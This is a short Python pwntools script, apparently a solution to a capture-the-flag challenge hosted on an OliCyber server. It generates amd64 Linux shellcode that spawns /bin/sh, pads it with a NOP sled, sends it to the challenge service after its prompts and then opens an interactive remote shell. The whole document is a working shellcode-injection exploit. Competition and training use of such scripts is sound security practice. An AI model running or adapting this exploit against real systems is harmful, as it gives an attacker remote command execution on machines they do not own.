from pwn import *

asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')

InOut = remote("software-20.challs.olicyber.it", 13003)

InOut.recvuntil(b'... Invia un qualsiasi carattere per iniziare ...')
InOut.sendline(b'a')
InOut.recvuntil(b'Shellcode size (max 4096): ')
InOut.sendline(b'100')
InOut.recvuntil(b'Send me exactly 100 bytes: ')

shellcode = shellcode.rjust(100, b'\x90')

InOut.sendline(shellcode)

InOut.interactive()
